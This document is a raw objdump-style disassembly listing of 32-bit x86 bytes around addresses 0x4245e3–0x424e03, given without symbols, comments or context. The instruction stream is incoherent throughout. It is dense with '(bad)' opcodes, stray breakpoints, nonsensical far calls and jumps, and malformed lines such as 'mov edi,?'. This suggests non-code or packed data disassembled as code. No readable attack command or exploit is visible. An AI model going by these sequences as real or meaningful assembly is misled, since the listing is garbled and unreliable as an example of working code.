  4245e3:	out    dx,al
  4245e4:	xchg   esp,eax
  4245e5:	add    bh,bl
  4245e7:	call   esp
  4245e9:	inc    DWORD PTR [eax]
  4245eb:	and    esi,DWORD PTR [edx-0x687ca700]
  4245f1:	int3   
  4245f2:	dec    ecx
  4245f4:	dec    edx
  4245f5:	add    BYTE PTR [ebx+0x0],ah
  4245f8:	pusha  
  4245f9:	int3   
  4245fa:	add    BYTE PTR [eax-0xd4ff41],bl
  424600:	push   cs
  424601:	(bad)  
  424602:	(bad)  
  424603:	cli    
  424604:	push   0x908371ff
  424609:	(bad)  
  42460a:	jmp    DWORD PTR [esi+0x4b]
  42460d:	call   FWORD PTR [edi+edi*8+0x2383fff2]
  424614:	or     DWORD PTR ss:[edx-0x33004001],0x54
  42461c:	idiv   bh
  42461e:	mov    ds:0x39ff,eax
  424623:	push   ds
  424624:	dec    ebp
  424625:	adc    eax,0xffffffcc
  424628:	push   eax
  424629:	inc    DWORD PTR [eax]
  42462b:	mov    dl,0xcf
  42462d:	add    BYTE PTR [edi],bh
  42462f:	int3   
  424630:	(bad)  
  424631:	(bad)  
  424632:	(bad)  
  424633:	in     al,dx
  424634:	lods   al,BYTE PTR ds:[esi]
  424635:	(bad)  
  424636:	out    dx,al
  424637:	add    BYTE PTR [ebp+0x0],ch
  42463a:	sub    edx,0x76
  42463d:	add    ch,bl
  42463f:	call   DWORD PTR [eax-0x5d530001]
  424645:	add    BYTE PTR [esi-0x34],al
  424648:	adc    DWORD PTR [eax],eax
  42464a:	int3   
  42464b:	addr16 cmp al,0x0
  42464e:	cli    
  42464f:	add    DWORD PTR [ecx-0x34],0x0
  424653:	fnstcw WORD PTR [esi]
  424655:	int3   
  424656:	xor    cl,BYTE PTR [ecx+0x7e00ffef]
  42465c:	je     0x42465e
  42465e:	jns    0x42462c
  424660:	mov    ds:0x3a51ffff,eax
  424665:	jmp    DWORD PTR [edx-0x7c7c9200]
  42466b:	pop    ebp
  42466c:	mov    ds:0x8cff2600,al
  424671:	cmp    edi,0xfffffff0
  424674:	leave  
  424675:	add    BYTE PTR [ebp-0x1],bh
  424678:	inc    ebp
  424679:	(bad)  
  42467a:	inc    DWORD PTR [ebx+0x1effed]
  424680:	add    bh,bh
  424682:	int3   
  424683:	pop    ecx
  424684:	idiv   bh
  424686:	sbb    eax,DWORD PTR [ebx-0x607600b1]
  42468c:	push   cs
  42468d:	and    DWORD PTR [edi+edi*8],0x60
  424691:	inc    DWORD PTR [eax]
  424693:	cmc    
  424694:	adc    eax,0xa1ff74ff
  424699:	cmp    edi,0x29
  42469c:	mov    ch,0xff
  42469e:	in     al,0x83
  4246a0:	or     al,0xff
  4246a2:	sbb    edx,0xffffffb0
  4246a5:	dec    ebp
  4246a7:	add    BYTE PTR [ecx],al
  4246a9:	(bad)  
  4246aa:	jmp    FWORD PTR [ebx-0x21]
  4246ad:	jmp    FWORD PTR [ebp-0xffdc00]
  4246b3:	bound  eax,QWORD PTR [eax]
  4246b5:	add    BYTE PTR [ebx+0x47ff],bl
  4246bb:	aaa    
  4246bc:	mov    ebx,0xd200e2ff
  4246c1:	add    ah,cl
  4246c3:	xchg   ebx,eax
  4246c4:	test   al,0xff
  4246c6:	xlat   BYTE PTR ds:[ebx]
  4246c7:	add    dh,cl
  4246c9:	dec    esp
  4246cb:	pop    ss
  4246cc:	arpl   di,di
  4246ce:	cmp    al,BYTE PTR [eax]
  4246d0:	jb     0x4246d1
  4246d2:	add    BYTE PTR [edi],dh
  4246d4:	outs   dx,BYTE PTR ds:[esi]
  4246d5:	sbb    DWORD PTR [ecx],0xffffff83
  4246d8:	sub    eax,0x6a998300
  4246dd:	jmp    FWORD PTR [edi-0x33003f7d]
  4246e3:	repnz push ecx
  4246e5:	jmp    DWORD PTR [edx]
  4246e7:	int3   
  4246e8:	jmp    0x234047ec
  4246ed:	int3   
  4246ee:	jne    0x4246ef
  4246f0:	mov    edx,0xec4bffcc
  4246f5:	add    cl,bl
  4246f7:	call   DWORD PTR [ecx]
  4246f9:	mov    edi,edi
  4246fb:	jl     0x4246f7
  4246fd:	(bad)  
  4246fe:	(bad)  
  4246ff:	push   DWORD PTR [esi-0x34]
  424702:	cmp    eax,0xffffffb4
  424705:	mov    DWORD PTR [edi-0x1],esp
  424708:	fcos   
  42470a:	dec    DWORD PTR [esi+0x3f]
  42470d:	add    BYTE PTR [esi+0xac00],cl
  424713:	lods   eax,DWORD PTR ds:[esi]
  424714:	je     0x42469f
  424716:	mov    edi,edi
  424718:	inc    esi
  424719:	inc    DWORD PTR [eax]
  42471b:	jmp    0x3ed11f
  424720:	xchg   ebx,eax
  424721:	inc    DWORD PTR [ebx-0x680014b3]
  424727:	add    BYTE PTR [edi-0x6c69337d],cl
  42472d:	call   DWORD PTR [edi+0xcc1000]
  424733:	inc    esp
  424734:	dec    ebx
  424735:	int3   
  424736:	pop    esp
  424737:	add    al,ch
  424739:	add    BYTE PTR [eax],al
  42473b:	mov    eax,0x1dff59
  424740:	sar    edi,cl
  424742:	add    al,bl
  424744:	fild   WORD PTR [eax]
  424746:	js     0x424714
  424748:	(bad)  
  424749:	add    BYTE PTR [eax],al
  42474b:	(bad)  
  42474c:	fiadd  DWORD PTR [eax]
  42474e:	addr16 (bad) 
  424750:	mov    esi,0x6778ffff
  424755:	add    BYTE PTR [esi-0xff2d01],bh
  42475b:	dec    esp
  42475c:	call   0x83ff:0x9c8906ff
  424763:	and    esi,DWORD PTR [edx-0x55ff3300]
  424769:	inc    DWORD PTR [ebx-0x5600a384]
  42476f:	add    BYTE PTR [ebp-0x77],ah
  424772:	mov    DWORD PTR [eax+0x3c],ecx
  424775:	add    BYTE PTR [ecx-0x7d],dh
  424778:	dec    eax
  424779:	(bad)  
  42477a:	inc    DWORD PTR [eax-0x33e8ff9b]
  424780:	fiadd  WORD PTR [ebx-0x7b0300]
  424786:	pop    ds
  424787:	call   DWORD PTR [ebx]
  424789:	add    BYTE PTR [eax],al
  42478b:	pop    ebp
  42478c:	popa   
  42478d:	(bad)  
  42478e:	stc    
  42478f:	dec    edi
  424791:	int3   
  424792:	call   DWORD PTR [edx+0xb6cc2e]
  424798:	sbb    bh,bh
  42479a:	cmp    DWORD PTR [ecx-0x33],0x0
  42479e:	xor    BYTE PTR [ebx+0x240000b9],al
  4247a4:	int3   
  4247a5:	add    BYTE PTR [eax+0xfffe83],dh
  4247ab:	scas   al,BYTE PTR es:[edi]
  4247ac:	stc    
  4247ad:	add    BYTE PTR [ecx-0x7c00d300],dh
  4247b3:	add    edi,0xffffffff
  4247b6:	repz inc DWORD PTR [ebp-0x7d]
  4247ba:	push   DWORD PTR [esi]
  4247bc:	outs   dx,BYTE PTR ds:[esi]
  4247bd:	dec    ebx
  4247bf:	dec    edx
  4247c1:	cmp    edi,0xffffffb0
  4247c4:	inc    ebp
  4247c5:	inc    DWORD PTR [edx]
  4247c7:	add    BYTE PTR [ebp+0x0],bh
  4247ca:	int3   
  4247cb:	fdivr  QWORD PTR [ecx+0x0]
  4247ce:	sub    edi,edi
  4247d0:	xchg   edx,eax
  4247d1:	add    BYTE PTR [eax],al
  4247d3:	mov    edx,0x5eff8f
  4247d8:	inc    esi
  4247d9:	int3   
  4247da:	add    BYTE PTR [edi-0xac00c5],bh
  4247e0:	mov    es,WORD PTR [ebx-0x6e734]
  4247e6:	outs   dx,DWORD PTR ds:[esi]
  4247e7:	sub    DWORD PTR [ecx],0xffffff83
  4247ea:	jmp    eax
  4247ec:	ins    BYTE PTR es:[edi],dx
  4247ed:	(bad)  
  4247ee:	fcos   
  4247f0:	ins    BYTE PTR es:[edi],dx
  4247f1:	int3   
  4247f2:	int3   
  4247f3:	pop    ecx
  4247f4:	in     eax,dx
  4247f5:	add    BYTE PTR [ecx-0x7cffa900],dl
  4247fb:	pop    esi
  4247fc:	cld    
  4247fd:	inc    DWORD PTR [edi]
  4247ff:	add    BYTE PTR [ecx-0x1],bh
  424802:	add    BYTE PTR [eax-0x7c22ffcd],bl
  424808:	(bad)  
  424809:	inc    DWORD PTR [ebx-0x190063df]
  42480f:	add    BYTE PTR [edx-0x7d],al
  424812:	add    BYTE PTR [edi-0xaf005a],ch
  424818:	ins    BYTE PTR es:[edi],dx
  424819:	or     esp,0xfffffffe
  42481c:	dec    esp
  42481e:	leave  
  42481f:	dec    DWORD PTR [edx+0x135d00ff]
  424825:	add    BYTE PTR [ecx],dl
  424827:	dec    DWORD PTR [edi+edi*8]
  42482a:	int3   
  42482b:	sti    
  42482c:	mov    al,ds:0xfb0093ff
  424831:	(bad)  
  424832:	jmp    DWORD PTR [ebx]
  424834:	mov    edi,?
  424836:	test   edi,edi
  424838:	fdivr  st,st(7)
  42483a:	add    DWORD PTR [esp+eax*1+0x15ffe9ff],0xffffffcc
  424842:	dec    DWORD PTR [ebx-0x69]
  424845:	add    ch,cl
  424847:	add    DWORD PTR [esi],0xffffff83
  42484a:	cmp    DWORD PTR [ebx],0x5e
  42484d:	and    DWORD PTR ds:0xcccca600,0x50
  424854:	add    edi,edi
  424856:	pop    ebp
  424857:	add    BYTE PTR [ebx-0x1],al
  42485a:	add    BYTE PTR [edi-0x5e],bl
  42485d:	inc    DWORD PTR [ecx]
  42485f:	add    BYTE PTR [edx],bl
  424861:	inc    DWORD PTR [ebx-0x74002625]
  424867:	jmp    FWORD PTR [ebp-0x1]
  42486a:	call   DWORD PTR [ecx-0x7cd476d5]
  424870:	sub    bh,bh
  424872:	mov    ecx,ecx
  424874:	push   cx
  424877:	add    bl,ch
  424879:	cmp    edi,0xffffffe4
  42487c:	fdivr  st,st(7)
  42487e:	mov    cl,0xff
  424880:	fs (bad) 
  424882:	(bad)  
  424883:	jle    0x424841
  424885:	add    BYTE PTR [ecx+0xffc8ff],ah
  42488b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42488c:	xchg   edi,eax
  42488d:	add    dl,al
  42488f:	add    BYTE PTR ds:0xd31fffcc,ah
  424895:	int3   
  424896:	jmp    0x8442089a
  42489b:	pop    ebx
  42489c:	sti    
  42489d:	call   FWORD PTR [esi-0x7d]
  4248a0:	push   edx
  4248a1:	(bad)  
  4248a2:	call   FWORD PTR [esi]
  4248a4:	dec    esp
  4248a5:	dec    DWORD PTR [edi-0xff1d7d]
  4248ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248ac:	cmp    al,0x83
  4248ae:	in     al,0xff
  4248b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248b1:	int3   
  4248b2:	jmp    eax
  4248b4:	rol    DWORD PTR [eax],cl
  4248b6:	es jmp ebx
  4248b9:	(bad)  
  4248ba:	call   FWORD PTR [edx+ecx*1]
  4248bd:	adc    DWORD PTR [esi-0x1],0xffffffe9
  4248c1:	(bad)  
  4248c2:	(bad)  
  4248c3:	jnp    0x4248c6
  4248c5:	call   eax
  4248c7:	inc    edi
  4248c9:	cmp    edi,0x7b
  4248cc:	push   ecx
  4248cd:	add    BYTE PTR [ebx],ah
  4248cf:	inc    DWORD PTR [ebx-0x7d]
  4248d2:	add    BYTE PTR [ebx-0x5e],ah
  4248d5:	add    BYTE PTR [ebp-0x77],ah
  4248d8:	cmp    eax,0x7f10ff89
  4248dd:	dec    DWORD PTR [ebx-0x7d]
  4248e0:	popf   
  4248e1:	mov    edi,edi
  4248e3:	fsub   st,st(3)
  4248e5:	call   DWORD PTR ds:0x4bff
  4248eb:	push   0x63
  4248ed:	jmp    FWORD PTR [ecx-0x7600a477]
  4248f3:	(bad)  
  4248f4:	nop
  4248f5:	call   DWORD PTR [ecx]
  4248f7:	int3   
  4248f8:	add    BYTE PTR [eax],al
  4248fa:	add    dl,cl
  4248fc:	mov    edi,0x7c006000
  424901:	add    BYTE PTR [eax],al
  424903:	sbb    DWORD PTR [ecx+0x583fbff],esi
  424909:	add    BYTE PTR [eax],al
  42490b:	leave  
  42490c:	xchg   edx,eax
  42490d:	add    dl,ch
  42490f:	inc    DWORD PTR [ecx-0x74b00001]
  424915:	jmp    DWORD PTR [edx]
  424917:	add    cl,dh
  424919:	dec    esp
  42491b:	call   FWORD PTR [edi+edi*8]
  42491e:	scas   eax,DWORD PTR es:[edi]
  42491f:	add    BYTE PTR [eax-0x1],al
  424922:	jmp    esi
  424924:	into   
  424925:	add    BYTE PTR [esi],bh
  424927:	dec    DWORD PTR [ebx-0x1bafff01]
  42492d:	mov    DWORD PTR ds:0x1a83,esi
  424933:	lock mov ds:0xc7000dff,eax
  424939:	mov    edi,edi
  42493b:	addr16 push 0x0
  42493e:	jl     0x4248c3
  424940:	fld    QWORD PTR [eax]
  424942:	add    BYTE PTR [edx+0x38],bl
  424945:	inc    DWORD PTR [ebp-0xff3400]
  42494b:	cs cwde 
  42494d:	inc    DWORD PTR [ebp+0x0]
  424950:	call   0x944115de
  424955:	add    al,al
  424957:	add    BYTE PTR [ebx],al
  424959:	mov    edi,edi
  42495b:	push   edi
  42495c:	push   ecx
  42495d:	call   FWORD PTR [ecx+0xff2c00]
  424963:	sar    BYTE PTR [eax+0x0],1
  424966:	mov    edi,edi
  424968:	sbb    eax,DWORD PTR [eax]
  42496a:	(bad)  
  42496b:	out    dx,al
  42496c:	out    dx,al
  42496d:	int3   
  42496e:	pushf  
  42496f:	mov    DWORD PTR [edx-0x1],ebp
  424972:	sub    DWORD PTR [eax],0x5e
  424975:	int3   
  424976:	out    dx,eax
  424977:	and    DWORD PTR [esi],0x0
  42497a:	(bad)  
  42497b:	mov    ebp,0xadcc5e
  424980:	add    BYTE PTR [eax],0x0
  424983:	loopne 0x42499c
  424985:	cmp    DWORD PTR [ebx],0xffffffff
  424988:	into   
  424989:	add    bh,bh
  42498b:	sbb    DWORD PTR [ebx+0x0],ebx
  42498e:	test   ah,0xc5
  424991:	inc    DWORD PTR [eax]
  424993:	bnd jns 0xcf4955
  42499a:	int3   
  42499b:	js     0x424a0a
  42499d:	add    ch,al
  42499f:	int3   
  4249a0:	push   esp
  4249a1:	mov    DWORD PTR [ebx-0x87c825f],eax
  4249a7:	inc    DWORD PTR [edx-0x7d]
  4249aa:	add    BYTE PTR [edi-0xb20052],dl
  4249b0:	inc    ebp
  4249b1:	add    bh,bh
  4249b3:	mov    cl,0xcc
  4249b5:	add    BYTE PTR ds:0xffccda00,bh
  4249bb:	or     BYTE PTR [esi-0x1],cl
  4249be:	fisttp DWORD PTR [ecx-0x160076b6]
  4249c4:	jns    0x424992
  4249c6:	sti    
  4249c7:	int3   
  4249c8:	add    DWORD PTR [eax],0xffffff83
  4249cb:	sbb    ah,BYTE PTR [ecx]
  4249cd:	add    BYTE PTR [esi-0x7d],ah
  4249d0:	sbb    eax,0xc4cffff
  4249d5:	add    ch,bh
  4249d7:	call   DWORD PTR [ecx-0x34]
  4249da:	add    BYTE PTR [esi+0x50],ch
  4249dd:	add    BYTE PTR [eax+eax*1-0x65],al
  4249e1:	inc    DWORD PTR [ebx+0x73ffd72e]
  4249e7:	mov    esp,ebx
  4249e9:	add    bh,bh
  4249eb:	repz cmp eax,0xb10049ff
  4249f1:	cmp    edi,0x69
  4249f4:	pop    ds
  4249f5:	add    BYTE PTR [edi+edi*8],bl
  4249f8:	mov    edi,0xe63c0089
  4249fd:	add    al,dh
  4249ff:	(bad)  
  424a00:	cmp    edi,edi
  424a02:	add    BYTE PTR [esi],ch
  424a04:	push   ds
  424a05:	add    BYTE PTR [esi+0x0],ch
  424a08:	push   eax
  424a09:	add    DWORD PTR [eax],0xffffffe8
  424a0c:	adc    eax,0xda83b783
  424a11:	add    BYTE PTR [ebx+0x4800a046],al
  424a17:	(bad)  
  424a18:	stc    
  424a19:	add    DWORD PTR [eax],0x40
  424a1c:	(bad)  
  424a1d:	(bad)  
  424a1e:	jmp    0x4249ec
  424a20:	mov    eax,DWORD PTR [eax]
  424a22:	inc    edx
  424a24:	adc    al,0x0
  424a26:	aam    0x83
  424a28:	pushf  
  424a29:	inc    DWORD PTR [eax]
  424a2b:	mov    eax,ds:0x28ff47
  424a30:	push   0x30c50000
  424a35:	(bad)  
  424a36:	mov    edi,0xffff9bff
  424a3b:	mov    dl,0xa2
  424a3d:	add    BYTE PTR [ebp-0x4500],dh
  424a43:	pop    ds
  424a44:	inc    esp
  424a45:	add    BYTE PTR [esi+0xff5700],ch
  424a4b:	xchg   BYTE PTR [eax],cl
  424a4d:	mov    DWORD PTR [eax+0x0],ebp
  424a50:	addr16 (bad) 
  424a52:	push   DWORD PTR [edi]
  424a54:	inc    esi
  424a55:	(bad)  
  424a56:	jns    0x424a58
  424a58:	add    DWORD PTR [eax],0xffffffff
  424a5b:	push   ebp
  424a5c:	call   FWORD PTR fs:[esi-0xff0500]
  424a63:	sti    
  424a64:	push   esp
  424a65:	int3   
  424a66:	lods   eax,DWORD PTR ds:[esi]
  424a67:	inc    edi
  424a69:	(bad)  
  424a6a:	dec    DWORD PTR [edx-0x27]
  424a6d:	int3   
  424a6e:	sub    bh,bh
  424a70:	mov    es,WORD PTR [eax]
  424a72:	mov    DWORD PTR [ebp-0x8],ebp
  424a75:	mov    edx,ecx
  424a77:	sub    DWORD PTR [ebp-0x750cff01],0xffffffff
  424a7e:	mov    DWORD PTR [eax],eax
  424a80:	push   ebp
  424a81:	dec    DWORD PTR [ecx-0x100fd28]
  424a87:	add    eax,0xffffffff
  424a8a:	call   DWORD PTR [esi-0x65]
  424a8d:	call   DWORD PTR [edi+edi*8]
  424a90:	pop    ebx
  424a91:	(bad)  
  424a92:	(bad)  
  424a93:	(bad)  
  424a94:	fadd   DWORD PTR [edx-0x337aae7d]
  424a9a:	dec    esp
  424a9c:	cmp    eax,0xf23ff10
  424aa1:	int3   
  424aa2:	(bad)  
  424aa3:	inc    DWORD PTR [esi]
  424aa5:	ss int3 
  424aa7:	popf   
  424aa8:	xchg   edi,eax
  424aa9:	add    bh,bh
  424aab:	call   ecx
  424aad:	pop    ss
  424aae:	dec    DWORD PTR [eax+esi*1+0x40ff0000]
  424ab5:	cli    
  424ab6:	(bad)  
  424ab7:	cli    
  424ab8:	(bad)  
  424ab9:	cmp    edi,0xffffffff
  424abc:	dec    edx
  424abd:	mov    edi,?
  424abf:	ror    DWORD PTR ds:0xf1ff0000,0x2f
  424ac6:	add    BYTE PTR [esi],cl
  424ac8:	sub    eax,0xcaff89ff
  424acd:	mov    bl,0x0
  424acf:	outs   dx,DWORD PTR ds:[esi]
  424ad0:	mov    bh,bh
  424ad2:	dec    esp
  424ad4:	mov    ecx,0xcdb1837d
  424ad9:	(bad)  
  424ada:	inc    DWORD PTR [eax]
  424adc:	loopne 0x424b55
  424ade:	add    BYTE PTR [esi-0x7c007c5f],bl
  424ae4:	test   ch,0xff
  424ae7:	stc    
  424ae8:	loop   0x424ae9
  424aea:	add    DWORD PTR [eax],0x13
  424aed:	dec    ebp
  424aee:	add    DWORD PTR [ebp+0x83ff84],0x71
  424af5:	ret    0xda00
  424af8:	retf   0xccff
  424afb:	add    ah,dh
  424afd:	les    eax,FWORD PTR [ebx-0x33ffe57b]
  424b03:	call   FWORD PTR [ecx-0x20280010]
  424b09:	add    bh,bh
  424b0b:	or     DWORD PTR [ebp-0x7bca0094],0xffffffcc
  424b12:	add    bh,bh
  424b14:	popf   
  424b15:	sbb    al,0xff
  424b17:	adc    eax,0x83ffffcd
  424b1c:	dec    esp
  424b1d:	and    al,0x0
  424b1f:	jno    0x424b26
  424b21:	add    ah,cl
  424b23:	add    BYTE PTR [ebx-0x578e7c48],dh
  424b29:	add    DWORD PTR [eax],0xffffffcc
  424b2c:	dec    esi
  424b2d:	pushf  
  424b2e:	(bad)  
  424b2f:	mov    ecx,0xccff3b
  424b34:	jle    0x424b23
  424b36:	add    BYTE PTR [edx-0x337b],cl
  424b3c:	stos   BYTE PTR es:[edi],al
  424b3d:	gs (bad) 
  424b3f:	mov    esi,0x89890067
  424b44:	imul   ecx,DWORD PTR [edx],0xffa48500
  424b4a:	add    DWORD PTR [eax],0xffffffa0
  424b4d:	push   es
  424b4e:	add    BYTE PTR [edx+0x66],ch
  424b51:	(bad)  
  424b52:	(bad)  
  424b53:	dec    ecx
  424b55:	pushf  
  424b56:	add    BYTE PTR [eax-0xff001c],al
  424b5c:	xchg   edx,eax
  424b5d:	push   ss
  424b5e:	(bad)  
  424b5f:	mov    edi,0xff0000bc
  424b64:	mov    ah,0x59
  424b66:	add    BYTE PTR [eax],cl
  424b68:	push   esp
  424b69:	inc    DWORD PTR [eax]
  424b6b:	add    BYTE PTR [eax+eax*8-0x33dc2f01],bh
  424b72:	add    bh,bh
  424b74:	fs or  edi,edi
  424b77:	dec    ebp
  424b78:	and    BYTE PTR [ebx+0x701ffcc],al
  424b7e:	and    ecx,0xffffffd6
  424b81:	(bad)  
  424b82:	(bad)  
  424b83:	jmp    FWORD PTR [esi]
  424b85:	add    BYTE PTR [eax],0x44
  424b88:	fcos   
  424b8a:	inc    DWORD PTR [ebx+0x66832e95]
  424b90:	push   0xe8ccffff
  424b95:	xchg   esi,eax
  424b96:	jmp    ebx
  424b98:	aam    0xff
  424b9a:	add    bh,bh
  424b9c:	inc    ecx
  424b9d:	push   esp
  424b9e:	push   DWORD PTR [edi+0x5c]
  424ba1:	cmp    edi,0xffffffff
  424ba4:	cmc    
  424ba5:	and    al,0xcc
  424ba7:	jns    0x424c19
  424ba9:	(bad)  
  424baa:	inc    DWORD PTR [ebx-0x697c16b2]
  424bb0:	scas   eax,DWORD PTR es:[edi]
  424bb1:	dec    DWORD PTR [ecx-0x742601]
  424bb7:	fwait
  424bb8:	pop    ecx
  424bb9:	add    ah,cl
  424bbb:	add    ah,bl
  424bbd:	push   ebx
  424bbe:	inc    DWORD PTR [edx+0x31]
  424bc1:	(bad)  
  424bc2:	(bad)  
  424bc3:	push   edx
  424bc5:	jb     0x424bc7
  424bc7:	fnsave [edi+0x778900ff]
  424bcd:	idiv   edi
  424bcf:	adc    DWORD PTR ds:0xd589ff83,ecx
  424bd5:	dec    ebx
  424bd6:	(bad)  
  424bd7:	cmp    bl,BYTE PTR [edi]
  424bd9:	add    bh,bh
  424bdb:	xor    esp,0xffffffb1
  424bde:	add    DWORD PTR [ebp+edx*8-0x77],0xffffffff
  424be3:	(bad)  
  424be4:	std    
  424be5:	mov    edx,0xff592983
  424bea:	mov    DWORD PTR [eax],eax
  424bec:	or     DWORD PTR [ebx],eax
  424bee:	add    BYTE PTR [eax],al
  424bf0:	inc    esp
  424bf1:	(bad)  
  424bf2:	inc    DWORD PTR [eax]
  424bf4:	loop   0x424c32
  424bf6:	call   DWORD PTR [esi-0x65]
  424bf9:	add    DWORD PTR [ebx-0x76d10001],0xd
  424c00:	clc    
  424c01:	dec    DWORD PTR [ecx-0x76fef200]
  424c07:	into   
  424c08:	sbb    eax,0x3b00ff00
  424c0d:	dec    eax
  424c0e:	int3   
  424c0f:	jne    0x424c6f
  424c11:	(bad)  
  424c12:	inc    DWORD PTR [eax]
  424c14:	add    al,0x7a
  424c16:	(bad)  
  424c17:	(bad)  
  424c19:	int3   
  424c1a:	dec    esp
  424c1c:	xchg   DWORD PTR [ebp+0x1ba200],esp
  424c22:	dec    DWORD PTR [ecx-0x353390f5]
  424c28:	int    0x0
  424c2a:	(bad)  
  424c2b:	call   FWORD PTR [ebp+0x6a]
  424c2e:	int3   
  424c2f:	mov    ebx,0xff83ffc7
  424c34:	cmp    ch,al
  424c36:	add    BYTE PTR [eax-0x7cff0087],ah
  424c3c:	test   eax,0x571dff60
  424c41:	int3   
  424c42:	add    BYTE PTR [eax],al
  424c44:	lock aaa 
  424c46:	sub    DWORD PTR [edi-0x3a],0xffffff83
  424c4a:	inc    DWORD PTR [eax]
  424c4c:	std    
  424c4d:	cmp    bh,bh
  424c4f:	mov    ch,0x4
  424c51:	(bad)  
  424c52:	(bad)  
  424c53:	jmp    FWORD PTR [edx-0x2c20ff06]
  424c59:	int3   
  424c5a:	(bad)  
  424c5b:	jmp    DWORD PTR [edx+esi*4-0x76962401]
  424c62:	(bad)  
  424c63:	inc    DWORD PTR [ebp+0x2c]
  424c66:	mov    edi,esp
  424c68:	sbb    bh,bh
  424c6a:	or     esp,0x6
  424c6d:	aad    0x0
  424c6f:	addr16 dec ecx
  424c71:	add    bh,bh
  424c73:	inc    DWORD PTR [esi]
  424c75:	jno    0x424c76
  424c77:	xor    al,0xe1
  424c79:	add    BYTE PTR [eax],al
  424c7b:	add    BYTE PTR [esi+eax*2-0x336a2c7d],ah
  424c82:	add    BYTE PTR [eax],al
  424c84:	or     dl,0xff
  424c87:	push   0x6
  424c89:	inc    DWORD PTR [eax]
  424c8b:	add    ah,dl
  424c8d:	sar    edi,cl
  424c8f:	test   BYTE PTR [ebx-0x1533ff7d],cl
  424c95:	or     eax,0xee4eff
  424c9a:	add    bh,bh
  424c9c:	sbb    al,0xa7
  424c9e:	jmp    FWORD PTR [eax-0xff5f]
  424ca4:	les    eax,FWORD PTR [ebx]
  424ca6:	mov    DWORD PTR [ebp+0x7b],esp
  424ca9:	mov    DWORD PTR [eax],eax
  424cab:	call   DWORD PTR [ebx-0x1e710083]
  424cb1:	add    DWORD PTR [eax],0xffffffff
  424cb4:	jo     0x424d03
  424cb6:	add    BYTE PTR [edi-0x73],ch
  424cb9:	inc    DWORD PTR [ebx+0x800183]
  424cbf:	gs scas eax,DWORD PTR es:[edi]
  424cc1:	(bad)  
  424cc2:	dec    esp
  424cc4:	test   eax,0x1ff9ffb1
  424cc9:	inc    DWORD PTR [ebx-0xedaf01]
  424ccf:	mov    ch,BYTE PTR [esi]
  424cd1:	inc    DWORD PTR [eax]
  424cd3:	add    dl,ah
  424cd5:	push   esi
  424cd6:	push   DWORD PTR [ebp-0xa]
  424cd9:	(bad)  
  424cda:	(bad)  
  424cdb:	inc    DWORD PTR [eax+0x2c]
  424cde:	add    dl,al
  424ce0:	adc    edi,edi
  424ce2:	cmp    edi,0xffffffd9
  424ce5:	inc    esp
  424ce6:	inc    DWORD PTR [ebx-0x9]
  424ce9:	add    BYTE PTR [ecx+0x871cff],cl
  424cef:	arpl   WORD PTR [ecx-0x6b000001],dx
  424cf5:	popa   
  424cf6:	push   DWORD PTR [edi-0x25]
  424cf9:	inc    DWORD PTR [ebx-0xd35634]
  424cff:	or     eax,0xffba
  424d04:	sti    
  424d05:	into   
  424d06:	add    ecx,0x16
  424d09:	(bad)  
  424d0a:	(bad)  
  424d0b:	(bad)  
  424d0c:	jmp    0xd8b54d4e
  424d11:	(bad)  
  424d12:	(bad)  
  424d13:	push   DWORD PTR [esi+0x4811ff2f]
  424d19:	add    bh,bh
  424d1b:	adc    DWORD PTR [ecx-0x1e],0xffffffcc
  424d1f:	repnz mov ebx,0x52cc00ff
  424d25:	mov    cl,0x83
  424d27:	and    BYTE PTR [edi-0x800ff01],0x9
  424d2e:	call   DWORD PTR [ebx+0x79]
  424d31:	inc    DWORD PTR [eax]
  424d33:	add    BYTE PTR [esi-0x74d700e1],dh
  424d39:	add    bh,bh
  424d3b:	jmp    FWORD PTR [ebx-0x5a]
  424d3e:	push   DWORD PTR [edi]
  424d40:	lea    eax,[eax]
  424d42:	(bad)  
  424d43:	jmp    edx
  424d45:	imul   eax,DWORD PTR [ebx-0x653f],0xd23500
  424d4f:	xor    eax,0xcc1b
  424d54:	add    al,dh
  424d56:	and    edi,0x57
  424d59:	int3   
  424d5a:	mov    DWORD PTR [eax],eax
  424d5c:	fstp   QWORD PTR [esi-0x1]
  424d5f:	inc    edx
  424d60:	and    edi,edi
  424d62:	inc    DWORD PTR [eax]
  424d64:	push   edi
  424d65:	popa   
  424d66:	push   ebp
  424d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d69:	dec    DWORD PTR [ecx-0xd3527d]
  424d6f:	hlt    
  424d70:	cli    
  424d71:	add    BYTE PTR [ecx-0x765c8700],cl
  424d77:	lock inc edx
  424d79:	dec    DWORD PTR [ecx-0xa8a601]
  424d7f:	push   edi
  424d80:	dec    eax
  424d81:	(bad)  
  424d82:	(bad)  
  424d83:	call   DWORD PTR [ebp-0x5cc27ce1]
  424d89:	add    bh,bh
  424d8b:	push   ecx
  424d8d:	push   ecx
  424d8e:	sub    DWORD PTR [eax+0x16],0x0
  424d92:	(bad)  
  424d93:	call   DWORD PTR [esp+eax*8]
  424d96:	add    BYTE PTR [ebx-0x7676fff9],ah
  424d9c:	les    ebx,FWORD PTR ds:0x891a48ff
  424da2:	add    BYTE PTR [ecx+0x5cff41a3],cl
  424da8:	call   0x47:0x64838389
  424daf:	lea    edi,[ebx-0x47007c77]
  424db5:	add    al,0x89
  424db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424db8:	data16 (bad) 
  424dba:	(bad)  
  424dbb:	call   FWORD PTR [edi+0x3d]
  424dbe:	jmp    FWORD PTR [edi]
  424dc0:	inc    ebx
  424dc1:	cmp    edi,0xffffffff
  424dc4:	push   0x4cb789e1
  424dc9:	inc    DWORD PTR [eax]
  424dcb:	add    BYTE PTR [edx+0x3b],ah
  424dce:	call   FWORD PTR [edx+0x8389a9]
  424dd4:	sar    dl,cl
  424dd6:	add    cl,bl
  424dd8:	cdq    
  424dd9:	add    bh,bh
  424ddb:	call   FWORD PTR [esp+edx*4+0xaf2dff]
  424de2:	add    DWORD PTR [eax],0x1e
  424de5:	jmp    FWORD PTR cs:[edx]
  424de8:	adc    edi,edi
  424dea:	add    DWORD PTR [ebx+0x1989a2fb],0xffffffb2
  424df1:	inc    DWORD PTR [eax]
  424df3:	call   ebp
  424df5:	test   esp,ecx
  424df7:	push   cs
  424df8:	fiadd  DWORD PTR [eax]
  424dfa:	add    bh,bh
  424dfc:	call   0xccff:0x3ab0ff90
  424e03:	add    BYTE PTR [edx+0x4d3bff5a],ah
